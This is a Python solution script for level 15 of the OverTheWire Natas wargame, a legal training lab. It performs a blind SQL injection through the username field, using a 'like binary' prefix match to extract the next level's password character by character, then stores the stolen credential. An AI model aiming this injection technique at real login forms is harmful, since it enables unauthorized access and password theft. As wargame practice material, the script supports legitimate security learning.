
import re,requests,base64,natas,string

USER='natas15'
PASSWORD=natas.get_credential(USER)

URL='http://natas15.natas.labs.overthewire.org/index.php'

def main():
    b64 = base64.b64encode('%s:%s' % (USER,PASSWORD))
    
    password = ''
    running = True
    while (running):
        found = False
        for c in string.ascii_letters + string.digits :
            if (guessed_correct(password + c, b64)):
                password = password + c
                found = True
                print(password)
                break
        if (not found):
            break
    
    print('found password: %s' % password)
    print('adding to credentials....')
    natas.save_credentials('natas16',password)
    print('done')

            

def guessed_correct(password, b64):
    query = 'natas16" and password like binary "%s' % password + '%'
    regex = r"doesn\'t"
    
    response = requests.post(
            URL,
            headers=dict(Authorization='Basic %s' % b64),
            data=dict(username='%s' % query)
    )

    matching = True
    matches = re.finditer(regex,response.content,re.MULTILINE)
    for match in matches:
        matching = False

    return matching


if __name__=='__main__':
    main()
